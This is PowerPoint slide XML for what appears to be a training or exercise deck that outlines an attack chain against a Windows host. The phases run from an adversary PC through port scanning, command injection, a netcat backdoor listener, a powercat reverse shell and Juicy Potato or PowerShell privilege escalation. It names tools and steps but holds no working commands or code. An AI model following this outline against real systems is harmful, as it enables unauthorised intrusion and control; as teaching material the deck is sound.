            <p:cNvPr id="73" name="テキスト ボックス 72">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F5D71BD-FF8F-45D6-8CC5-D531E349EBCF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394"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ssh,netcat</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> connection</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>command injection</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:gr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77895" y="83351"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16741087">
            <a:off x="4296713" y="3665607"/>
            <a:ext cx="4207996" cy="321232"/>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42890" y="3562621"/>
            <a:ext cx="4329966" cy="261811"/>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5" name="テキスト ボックス 74">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAE13DC7-33E9-4C8C-846C-2B82A0FCB0F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6693988" y="3570257"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>download and use nc64.exe</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    set backdoor(shell listener)</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>use </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Rverse</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> shell(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>powercat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="テキスト ボックス 75">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0294BDEE-6625-4BDA-A1D7-97C12E683760}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6805560" y="5341174"/>
            <a:ext cx="4387181" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Use Juicy Potato</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="四角形: 角を丸くする 76">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D8C7109-BCB9-4099-8CFF-100C6050DF24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6529583" y="138813"/>
            <a:ext cx="4878244" cy="1249686"/>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c</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="テキスト ボックス 77">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F25E53D-22CA-4594-9B83-DEC6726C2C1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6787317" y="795956"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>-for-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>windos</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> tool</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="79" name="グループ化 78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E03B1060-4008-4289-98BD-D85CCF88E71A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6624405" y="248316"/>
            <a:ext cx="4749018" cy="446123"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="四角形: 角を丸くする 79">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B94CC2D-A3DA-43A1-A1A1-030C6C525FF4}"/>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81" name="四角形: 角を丸くする 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE7F50B-7D31-44A4-8051-A6305F4FE67A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967591"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rPr>
                <a:t>Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="82" name="テキスト ボックス 81">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7243ED5A-8DDD-4AB6-A41A-ABC58206FD75}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="445900"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Use Exploit Tool</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="419532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四角形: 角を丸くする 62">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F294152-A6CE-4600-B182-615C662A69E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="301833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1455343"/>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1468545" y="447412"/>
            <a:ext cx="9691685" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach2:Privilege escalation exploiting PowerShell vulnerabilities</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1623624" y="1533875"/>
            <a:ext cx="4686162" cy="646332"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="646332"/>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523220"/>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Portscan,IPscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a: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99560"/>
            <a:ext cx="4784299" cy="646332"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646332"/>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520750"/>
              <a:ext cx="7763550" cy="444288"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="444288"/>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776110" y="2525905"/>
                <a:ext cx="5659204" cy="307777"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a: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06116" y="1581447"/>
            <a:ext cx="4735755" cy="751726"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7863244" cy="751726"/>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Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="14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49915" y="3291845"/>
              <a:ext cx="5585394" cy="738664"/>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708819" y="2201617"/>
            <a:ext cx="7460125" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </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1468545" y="116910"/>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5"/>
            <a:ext cx="5026053" cy="646332"/>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23220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>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0" name="グループ化 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA9BB01F-3B5A-4DCA-AE39-B3CF9EE2017C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="3123210"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="51" name="四角形: 角を丸くする 50">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4DEA3846-88FF-44C9-BAD8-874F89766A60}"/>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2" name="グループ化 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE1F6F3B-51D6-4047-BC44-691D3727E5D9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="53" name="四角形: 角を丸くする 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00D6F48F-4C89-4566-8982-808F2B2E0B62}"/>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tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Persistentence</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="54" name="テキスト ボックス 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E0EDDF-D1E9-4B0F-9D37-E4674A7D6C2A}"/>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646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>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4" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>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Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="14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09" y="2525905"/>
                <a:ext cx="5659205" cy="523220"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16704173">
            <a:off x="4216420" y="360894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72627" y="3592358"/>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985360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四角形: 角を丸くする 63">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F84F164-B51C-48DE-8866-B963762B669E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="4549258"/>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3" name="四角形: 角を丸くする 62">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F294152-A6CE-4600-B182-615C662A69E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="301833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四角形: 角を丸くする 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E89D79B4-3DCA-4877-8F4D-54456BA650A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="1455343"/>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1" name="四角形: 角を丸くする 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C53EDB0-60AB-4110-814A-3CA3D3E415D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="4565074"/>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0" name="四角形: 角を丸くする 59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEFF2B5F-A462-4595-ACA7-86BA8E8DB2A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1538161" y="3004765"/>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四角形: 角を丸くする 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12DAA20C-4E27-4E82-9EDC-874E7D263C87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="1432950"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent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2" name="グループ化 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42988117-EB1A-4DE9-B9C7-C66D6313DD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="328601" y="1320203"/>
            <a:ext cx="2039711" cy="1045029"/>
            <a:chOff x="639988" y="987878"/>
            <a:chExt cx="2039711" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="21" name="グループ化 20">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6605FE0D-B6A5-4872-B38B-C9420253B64C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="639988" y="987878"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="639988" y="987878"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="四角形: 角を丸くする 8">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20A5D123-2648-46C4-91C6-7D217A6A2D87}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="639988" y="987878"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">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二等辺三角形 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F55D6590-8BEF-4C54-A519-9C00E9FD11B1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="871310" y="1747157"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0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DDE372-227B-484F-8C89-C32F9237DC30}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="758369" y="109461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ボックス 14">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A6C198F-BEB5-45E6-A5CE-78DE4CE15F22}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="712107" y="1236712"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>AdversaryPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="20" name="グループ化 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A0F568C-FD3E-4960-9019-26D33DA84078}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10976968" y="5700666"/>
            <a:ext cx="2169661" cy="1045029"/>
            <a:chOff x="8990237" y="5765648"/>
            <a:chExt cx="2169661" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="19" name="グループ化 18">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EA675E4-9A30-4BEE-9EF8-B1692957D861}"/>
                </a:ext>
              </a:extLst>
